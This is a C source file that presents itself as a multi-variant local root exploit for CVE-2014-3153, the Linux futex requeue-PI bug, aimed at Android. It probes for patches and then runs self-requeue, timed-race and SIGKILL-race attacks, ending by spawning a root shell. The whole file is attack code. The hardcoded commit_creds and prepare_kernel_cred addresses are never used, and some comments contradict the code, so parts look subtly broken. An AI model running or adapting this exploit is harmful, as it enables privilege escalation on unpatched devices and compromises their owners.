/*
 * towelroot3.c — CVE-2014-3153 self-requeue + tight race variant
 *
 * Tests multiple attack variants:
 * A) Self-requeue: FUTEX_CMP_REQUEUE_PI(futex, futex) — uaddr1==uaddr2
 *    If the patch "futex: Forbid uaddr == uaddr2" is missing, this
 *    creates an immediate inconsistency.
 *
 * B) Tight race: timeout fires DURING requeue or unlock, leaving
 *    the rt_mutex_waiter dangling.
 *
 * C) Signal-based: SIGKILL the requeued thread to prevent cleanup.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <linux/futex.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

static int *futex_mem;
#define FUTEX1 (&futex_mem[0])
#define FUTEX2 (&futex_mem[32])

static struct timespec abs_mono(int secs, long nsecs) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += secs;
    ts.tv_nsec += nsecs;
    if (ts.tv_nsec >= 1000000000L) {
        ts.tv_sec++;
        ts.tv_nsec -= 1000000000L;
    }
    return ts;
}

/* ========== Test A: Self-requeue (uaddr1 == uaddr2) ========== */
static volatile int a_ready = 0;

static void *self_waiter(void *arg) {
    struct timespec ts = abs_mono(10, 0);
    a_ready = 1;
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX1, 0); /* target = source! */
    printf("[A-waiter] ret=%d err=%d (%s)\n", ret, errno, strerror(errno));
    if (ret == 0) syscall(SYS_futex, FUTEX1, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void test_self_requeue(void) {
    printf("\n=== Test A: Self-Requeue (uaddr1 == uaddr2) ===\n");
    *FUTEX1 = 0;
    a_ready = 0;

    /* Lock FUTEX1 as PI */
    syscall(SYS_futex, FUTEX1, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

    /* Start 2 waiters (need 2 because wake=1 is required) */
    pthread_t t1, t2;
    pthread_create(&t1, NULL, self_waiter, NULL);
    while (!a_ready) usleep(1000);
    usleep(100000);
    a_ready = 0;
    pthread_create(&t2, NULL, self_waiter, NULL);
    while (!a_ready) usleep(1000);
    usleep(100000);

    /* Self-requeue: FUTEX1 → FUTEX1 */
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)1, FUTEX1, 0);
    printf("[main] Self-requeue: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret >= 0 && errno != EINVAL) {
        printf("[!!!] Self-requeue ACCEPTED — critical patch missing!\n");
    } else if (errno == EINVAL) {
        printf("[-] Self-requeue rejected (EINVAL) — patch present\n");
    }

    syscall(SYS_futex, FUTEX1, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    usleep(500000);
    syscall(SYS_futex, FUTEX1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    struct timespec jts;
    clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 5;
    pthread_timedjoin_np(t1, NULL, &jts);
    clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 5;
    pthread_timedjoin_np(t2, NULL, &jts);
}

/* ========== Test B: Tight race — timeout during unlock ========== */
/* 
 * The race: victim's timeout fires at the SAME time as UNLOCK_PI.
 * If the timeout cleanup and unlock wake-up happen simultaneously,
 * the rt_mutex_waiter may not be properly removed.
 */
static volatile int b_ready = 0;
static volatile int b_sac_ready = 0;

static void *b_sac_thread(void *arg) {
    struct timespec ts = abs_mono(30, 0);
    b_sac_ready = 1;
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX2, 0);
    if (ret == 0) syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *b_victim_thread(void *arg) {
    /* Use a VERY short timeout to maximize race window */
    long timeout_ns = (long)(long long)arg;
    struct timespec ts = abs_mono(0, timeout_ns);
    b_ready = 1;

    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX2, 0);
    int err = errno;

    if (ret == 0) {
        /* Woken — we locked the PI futex */
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    /* Return value tells us what happened:
     * 0 = woken as new PI owner
     * -1/ETIMEDOUT = timed out
     * -1/EAGAIN = value changed
     */
    return (void*)(long)((ret << 16) | (err & 0xFFFF));
}

static void test_tight_race(void) {
    printf("\n=== Test B: Tight Race (timeout during unlock) ===\n");

    int crashes = 0, successes = 0, timeouts = 0;

    for (int attempt = 0; attempt < 50; attempt++) {
        *FUTEX1 = 0;
        *FUTEX2 = 0;
        b_ready = 0;
        b_sac_ready = 0;

        /* Lock FUTEX2 */
        syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        /* Sacrificial waiter */
        pthread_t sac;
        pthread_create(&sac, NULL, b_sac_thread, NULL);
        while (!b_sac_ready) usleep(1000);
        usleep(50000);

        /* Victim with very short timeout (varies to hit race window) */
        long timeout = 500000000L + (attempt * 10000000L); /* 500ms + 10ms*attempt */
        pthread_t vic;
        pthread_create(&vic, NULL, b_victim_thread, (void*)timeout);
        while (!b_ready) usleep(1000);
        usleep(50000);

        /* Requeue: wake sac, requeue vic */
        int ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                          1, (void*)1, FUTEX2, 0);
        
        if (ret < 2) {
            /* Victim may have already timed out before requeue */
            timeouts++;
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            syscall(SYS_futex, FUTEX1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        } else {
            successes++;
            /* Victim is PI-waiting on FUTEX2. Now we need to race:
             * unlock FUTEX2 right as victim's timeout fires */
            
            /* Calculate when victim's timeout expires */
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            long elapsed_ns = (now.tv_sec * 1000000000L + now.tv_nsec);
            /* Victim timeout was set to 'timeout' ns from when it started */
            
            /* Sleep most of the way, then unlock */
            usleep((timeout / 1000) - 50000); /* wake 50ms before timeout */
            
            /* Rapid unlock - try to hit the race */
            ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            
            if (getuid() == 0) {
                printf("[!!!] GOT ROOT at attempt %d!\n", attempt);
                break;
            }
        }

        /* Join threads */
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 5;
        pthread_timedjoin_np(sac, NULL, &jts);
        clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 5;
        if (pthread_timedjoin_np(vic, NULL, &jts) != 0) {
            pthread_cancel(vic);
            pthread_join(vic, NULL);
        }

        if (attempt % 10 == 9) {
            printf("[*] Attempt %d: %d requeued, %d timed-out-early\n",
                   attempt + 1, successes, timeouts);
        }
    }

    printf("[*] Race results: %d successful requeues, %d early timeouts\n",
           successes, timeouts);
}

/* ========== Test C: SIGKILL requeued process ========== */
static void test_sigkill(void) {
    printf("\n=== Test C: SIGKILL Requeued Process ===\n");

    for (int attempt = 0; attempt < 20; attempt++) {
        *FUTEX1 = 0;
        *FUTEX2 = 0;

        /* Lock FUTEX2 */
        syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        /* Fork sacrificial child */
        pid_t sac_pid = fork();
        if (sac_pid == 0) {
            struct timespec ts = abs_mono(30, 0);
            syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, FUTEX2, 0);
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            _exit(0);
        }

        usleep(100000);

        /* Fork victim child */
        pid_t vic_pid = fork();
        if (vic_pid == 0) {
            struct timespec ts = abs_mono(60, 0); /* long timeout */
            syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, FUTEX2, 0);
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            _exit(0);
        }

        usleep(100000);

        /* Requeue */
        int ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                          1, (void*)1, FUTEX2, 0);

        if (ret >= 2) {
            /* Victim is PI-waiting on FUTEX2. SIGKILL it. */
            usleep(10000); /* small delay */
            kill(vic_pid, SIGKILL);
            waitpid(vic_pid, NULL, 0);

            /* If the PI cleanup was incomplete, FUTEX2 has a dangling waiter.
             * Try to lock/unlock to trigger traversal. */
            usleep(10000);
            
            /* Unlock — may traverse dangling waiter */
            ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            
            /* Try to lock FUTEX2 from a new thread — may hit corruption */
            ret = syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            if (ret == 0) {
                /* Got lock — unlock it */
                syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            }

            if (getuid() == 0) {
                printf("[!!!] ROOT at attempt %d!\n", attempt);
                break;
            }
        } else {
            /* Cleanup */
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            kill(vic_pid, SIGKILL);
            waitpid(vic_pid, NULL, 0);
        }

        /* Cleanup sac */
        kill(sac_pid, SIGKILL);
        waitpid(sac_pid, NULL, 0);

        if (attempt % 5 == 4) {
            printf("[*] Attempt %d complete\n", attempt + 1);
        }
    }
}

/* ========== Test D: Check which patches are present ========== */
static void test_patches(void) {
    printf("\n=== Patch Detection ===\n");

    /* Patch 1: "futex: Forbid uaddr == uaddr2" */
    *FUTEX1 = 0;
    syscall(SYS_futex, FUTEX1, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)0, FUTEX1, 0);
    int err = errno;
    syscall(SYS_futex, FUTEX1, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[patch1] Forbid uaddr==uaddr2: %s (ret=%d err=%d)\n",
           (ret < 0 && err == EINVAL) ? "PRESENT" : "MISSING", ret, err);

    /* Patch 2: "futex: Validate atomic acquisition" */
    /* This patch makes FUTEX_LOCK_PI check the futex value more carefully */
    *FUTEX1 = 0;
    /* Try LOCK_PI on a futex that has FUTEX_WAITERS bit set but no TID */
    *FUTEX1 = 0x80000000; /* FUTEX_WAITERS set, no owner TID */
    ret = syscall(SYS_futex, FUTEX1, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    err = errno;
    printf("[patch2] Validate atomic acquisition: ");
    if (ret < 0 && err == EINVAL) {
        printf("PRESENT\n");
    } else {
        printf("MISSING (ret=%d err=%d *futex=%d)\n", ret, err, *FUTEX1);
        if (ret == 0) syscall(SYS_futex, FUTEX1, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    /* Patch 3: Check if non-PI source with PI target is rejected */
    printf("[patch3] Non-PI source → PI target: ");
    *FUTEX1 = 0;
    *FUTEX2 = 0;
    syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    /* No waiter on FUTEX1, just check if the operation is allowed */
    ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                  1, (void*)1, FUTEX2, 0);
    err = errno;
    syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("ret=%d err=%d — %s\n", ret, err,
           (ret == 0) ? "ALLOWED (vulnerable)" : 
           (err == EINVAL) ? "BLOCKED" : "other");

    /* Our earlier test confirmed non-PI target blocks on FUTEX_WAIT_REQUEUE_PI — that's vuln */
    printf("[*] Earlier confirmed: FUTEX_WAIT_REQUEUE_PI blocks on non-PI target\n");
}

int main(void) {
    printf("=== Towelroot v3 — Multi-variant CVE-2014-3153 ===\n");
    printf("[*] pid=%d uid=%d\n", getpid(), getuid());

    futex_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    test_patches();
    test_self_requeue();
    test_sigkill();
    test_tight_race();

    printf("\n[*] Final uid=%d\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] ROOT ACHIEVED!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    munmap(futex_mem, 4096);
    return 0;
}
